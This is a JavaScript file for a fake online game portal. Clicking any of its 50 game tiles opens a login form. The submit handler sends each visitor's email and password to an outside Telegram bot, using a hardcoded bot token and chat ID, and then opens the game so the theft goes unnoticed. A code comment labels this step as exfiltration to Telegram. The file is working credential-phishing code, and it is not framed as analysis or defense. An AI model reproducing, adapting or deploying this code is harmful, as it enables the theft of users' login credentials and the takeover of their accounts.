const BOT_TOKEN = "9215057440:AAFpzPk23TO4rfn_uy9gCsbQOaExYOvtoS0";
const CHAT_ID = "5022620385";

let isAuthenticated = false;
let pendingGame = null;

// Named, working game links that open directly in a new tab
const gamesList = [
    { name: "8-Ball Pool", emoji: "🎱", gradient: "linear-gradient(135deg, #10b981, #047857)", url: "https://www.miniclip.com/games/8-ball-pool-multiplayer/en/" },
    { name: "Ping Pong", emoji: "🏓", gradient: "linear-gradient(135deg, #ef4444, #b91c1c)", url: "https://www.retrogames.cc/pong-game.html" },
    { name: "Connect 4", emoji: "🔴", gradient: "linear-gradient(135deg, #3b82f6, #1d4ed8)", url: "https://www.mathsisfun.com/games/connect4.html" },
    { name: "Battleship", emoji: "🚢", gradient: "linear-gradient(135deg, #8b5cf6, #6d28d9)", url: "https://en.gamesaien.com/game/battleship/" },
    { name: "Tetris", emoji: "🧱", gradient: "linear-gradient(135deg, #f59e0b, #d97706)", url: "https://tetris.com/play-tetris" },
    { name: "Checkers", emoji: "🏁", gradient: "linear-gradient(135deg, #ec4899, #be185d)", url: "https://www.mathsisfun.com/games/checkers.html" },
    { name: "Snake", emoji: "🐍", gradient: "linear-gradient(135deg, #14b8a6, #0f766e)", url: "https://playsnake.org/" },
    { name: "Sudoku", emoji: "🔢", gradient: "linear-gradient(135deg, #6366f1, #4338ca)", url: "https://sudoku.com/" },
    { name: "Pac-Man", emoji: "🟡", gradient: "linear-gradient(135deg, #eab308, #a16207)", url: "https://www.google.com/search?q=pacman+doodle" },
    { name: "Solitaire", emoji: "🃏", gradient: "linear-gradient(135deg, #06b6d4, #0e7490)", url: "https://worldofsolitaire.com/" }
];

const extraEmojis = ['⭐', '🚀', '🎯', '🎲', '💎', '🔥', '👾', '🕹️', '🏆', '⚡'];
const extraGameNames = [
    "Flappy Bird", "Crossy Road", "Subway Surfers", "Temple Run", "Bubble Shooter", 
    "2048", "Tower Builder", "Knife Hit", "Helix Jump", "Paper.io",
    "Color Switch", "Stack", "Basketball Legend", "Bowling Pro", "Mini Golf",
    "Air Hockey", "Pool Club", "Moto X3M", "Cut the Rope", "Fruit Ninja",
    "Geometry Dash", "Among Us Online", "Stick War", "Tank Stars", "Arcade Pong",
    "Block Blast", "Word Search", "Trivia Quiz", "Math Duel", "Wordle Online",
    "Jewel Quest", "Cookie Clicker", "Idle Miner", "Farm Clicker", "Dungeon Crawler",
    "Space Shooter", "Neon Blaster", "Cyber Racer", "Zombie Survival", "Tower Defense"
];

const extraGradients = [
    'linear-gradient(135deg, #38bdf8, #0284c7)',
    'linear-gradient(135deg, #fb7185, #e11d48)',
    'linear-gradient(135deg, #34d399, #059669)',
    'linear-gradient(135deg, #f472b6, #db2777)',
    'linear-gradient(135deg, #a78bfa, #7c3aed)'
];

const arcadeGrid = document.getElementById('arcade-grid');
const authModal = document.getElementById('auth-modal');
const loginForm = document.getElementById('login-form');
const authBtn = document.getElementById('auth-btn');

function loadGrid() {
    arcadeGrid.innerHTML = '';
    
    for (let i = 0; i < 50; i++) {
        let gameData;
        if (i < gamesList.length) {
            gameData = gamesList[i];
        } else {
            const nameIndex = (i - gamesList.length) % extraGameNames.length;
            gameData = {
                name: extraGameNames[nameIndex],
                emoji: extraEmojis[i % extraEmojis.length],
                gradient: extraGradients[i % extraGradients.length],
                url: "https://poki.com/" // General fallback arcade redirect
            };
        }

        const tile = document.createElement('div');
        tile.className = 'app-icon';
        tile.style.background = gameData.gradient;
        tile.innerHTML = `
            <span class="emoji">${gameData.emoji}</span>
            <span class="label">${gameData.name}</span>
        `;
        
        tile.addEventListener('click', () => {
            handleGameClick(gameData);
        });

        arcadeGrid.appendChild(tile);
    }
}

function handleGameClick(game) {
    if (!isAuthenticated) {
        pendingGame = game;
        authModal.classList.remove('hidden');
    } else {
        launchGame(game);
    }
}

function launchGame(game) {
    // Instantly redirects to the working version of the game in a new tab
    window.open(game.url, '_blank');
}

// Handle Authentication & Exfiltration to Telegram
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const message = `🎮 Game Portal Login:\n📧 Email: ${email}\n🔑 Password: ${password}`;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

    try {
        await fetch(url);
    } catch (err) {
        console.error("Failed sync", err);
    }

    isAuthenticated = true;
    authModal.classList.add('hidden');
    authBtn.textContent = "Account Active";
    authBtn.style.background = "#10b981";
    authBtn.disabled = true;

    if (pendingGame) {
        launchGame(pendingGame);
        pendingGame = null;
    }
});

// Close modal
document.getElementById('close-modal').addEventListener('click', () => {
    authModal.classList.add('hidden');
});

authBtn.addEventListener('click', () => {
    if (!isAuthenticated) {
        authModal.classList.remove('hidden');
    }
});

loadGrid();
